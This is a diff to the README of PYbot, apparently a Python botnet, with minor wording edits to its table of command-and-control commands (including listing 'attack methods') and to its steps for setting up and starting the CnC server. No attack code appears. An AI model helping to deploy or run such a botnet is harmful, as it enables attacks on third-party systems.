@@ -9,7 +9,7 @@
 # CnC Commands
 Command | Description
 --------|------------
-help, ?, | Shows list of commands
+help, ? | Shows list of commands
 methods | Shows list of attack methods
 clear, cls | Clears the console window screen
 exit, logout | Disconnects from the C&C server
@@ -36,9 +36,9 @@ exit, logout | Disconnects from the C&C server
 
 # Installation
 1. Install Git and Python 3 on your server.
-2. Clone the PYbot Github repository to your server.
+2. Clone the PYbot Github repository to your server via Git.
 3. Change the host address and CnC port in the configuration section in [bot.py](/bot.py) to your server address.
-4. Start the server by executing the command `$ python cnc.py <cnc port>`.
+4. Start the CnC server by executing the command: `$ python cnc.py <cnc port>`.
 5. Add accounts in [logins.txt](/logins.txt) by using the format: `username:password`.
 6. Connect to the server via [PuTTY](https://www.putty.org/) in a raw socket connection.
 
